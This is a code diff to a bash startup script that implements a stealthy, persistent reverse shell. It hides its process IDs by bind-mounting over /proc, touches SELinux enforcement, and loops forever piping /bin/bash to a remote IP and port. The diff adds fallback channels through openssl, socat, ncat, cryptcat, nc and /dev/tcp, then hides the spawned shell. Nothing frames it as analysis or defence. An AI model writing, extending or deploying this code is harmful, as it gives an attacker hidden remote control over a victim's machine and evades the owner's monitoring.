@@ -27,7 +27,7 @@ mtab() {
     
     bash -c "command mount -n --bind '$_mask' /proc/\$\$; exec \"$1\" $_argstr" 
 }
-export -f mtab
+command builtin export -f mtab
 cleanup() { 
     # Kill background jobs
     local pids=$(jobs -p) 
@@ -63,23 +63,34 @@ command getenforce &>/dev/null && (getenforce | grep -q "Enforcing") && setenfor
 
 ### startup.sh ###
 
-IP="192.168.0.1"  
+IP="127.0.0.1"  
 PORT="4316" 
 
 trap cleanup EXIT SIGINT SIGTERM SIGHUP SIGTSTP
 
 mtab     # hide current script pid  
 
-# MAIN 
-while true; do 
-        mtab 
-        #FAKE_NAME="[BRUH--kworker/u$(shuf -i 0-5 -n 1):$(shuf -i 0-5 -n 1)]" 
-        #ETH=$(ip route get 1 | awk '{print $7;exit}' 2>/dev/null)
-
+# OPENSSL MAIN 
+# /dev/tcp MAIN
+while true; do
+        #mtab
         PIPE="/dev/shm/.cache_$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
         mkfifo "$PIPE"
 
-        ( /bin/bash < $PIPE 2>&1 | openssl s_client -quiet -connect $IP:$PORT > $PIPE ) &
+        if command -v openssl >/dev/null 2>&1; then
+                ( /bin/bash < $PIPE 2>&1 | openssl s_client -quiet -connect $IP:$PORT > $PIPE ) &
+        elif command -v socat >/dev/null 2>&1; then
+                ( socat OPENSSL:$IP:$PORT,verify=0 EXEC:/bin/bash ) &
+        elif command -v ncat >/dev/null 2>&1; then
+                ( /bin/bash < $PIPE 2>&1 | ncat --ssl $IP $PORT > $PIPE ) &
+        elif command -v cryptcat >/dev/null 2>&1; then
+                ( /bin/bash < $PIPE 2>&1 | cryptcat $IP $PORT > $PIPE ) &
+        elif command -v nc >/dev/null 2>&1; then
+                ( cat $PIPE |/bin/bash 2>&1|nc $IP $PORT > $PIPE ) &
+        else
+                ( /bin/bash  >& /dev/tcp/$IP/$PORT 0>&1 ) &
+        fi
+        # HIde the created shell
         pid=$!
         pids="$pid $(pgrep -P $pid)"
         for i in $pids;do mtab $i;done
@@ -89,5 +100,5 @@ while true; do
         umount -l /proc/$$ 2>/dev/null
 
         # This function handles its own mounting and unmounting
-        ssleep  
+        ssleep
 done &>/dev/null
